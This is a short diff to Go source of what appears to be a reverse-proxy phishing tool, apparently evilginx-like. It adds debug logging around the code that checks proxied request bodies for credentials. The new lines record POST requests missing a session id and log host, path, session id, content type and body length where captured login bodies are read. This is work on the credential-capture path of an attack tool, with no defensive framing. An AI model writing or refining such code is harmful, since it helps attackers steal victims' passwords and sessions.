@@ -738,6 +738,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				// check for creds in request body
+				if pl != nil && ps.SessionId == "" && req.Method == "POST" {
+					log.Debug("[cred-miss] POST %s host=%s — no sessionId (pl=%v ip=%s)", req.URL.Path, req.Host, pl != nil, remote_addr)
+				}
 				if pl != nil && ps.SessionId != "" {
 					req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
@@ -748,6 +751,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
 						req.ContentLength = int64(len(body))
 
+						log.Debug("[cred] host=%s path=%s method=%s sessionId=%s ct=%s bodyLen=%d", req.Host, req.URL.Path, req.Method, ps.SessionId, req.Header.Get("Content-Type"), len(body))
 						log.Debug("POST: %s", req.URL.Path)
 						log.Debug("POST body = %s", body)
 
